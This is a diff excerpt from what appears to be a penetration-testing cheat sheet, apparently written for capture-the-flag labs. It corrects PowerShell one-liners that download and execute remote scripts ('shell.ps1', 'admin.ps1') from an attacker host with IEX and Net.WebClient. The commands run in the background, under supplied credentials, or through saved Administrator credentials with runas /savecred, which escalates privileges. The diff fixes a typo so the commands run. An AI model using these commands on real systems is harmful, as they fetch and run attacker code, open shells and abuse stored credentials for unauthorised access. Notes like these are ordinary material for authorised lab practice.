@@ -186,9 +186,9 @@ iconv -t UTF-16LE | base64-w0
 powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
 start-process -Filepath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/adm.txt')" -credential $cred
 ## background
-START /B  ""  powershell -c IEX (New-ObjectNet.Webclient).downloadstring( 'http://10.10.14.2/shell.ps1' )
+START /B  ""  powershell -c IEX (New-Object Net.Webclient).downloadstring( 'http://10.10.14.2/shell.ps1' )
 ## savedcred dpapi/cmdkey
-runas /user:ACCESS\Administrator /savecred ​"powershell -c IEX (New-ObjectNet.Webclient).downloadstring('http://10.10.14.2/admin.ps1')"
+runas /user:ACCESS\Administrator /savecred  "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')"
 ```
 
 ### DOWNLOAD FILE CMD/PS
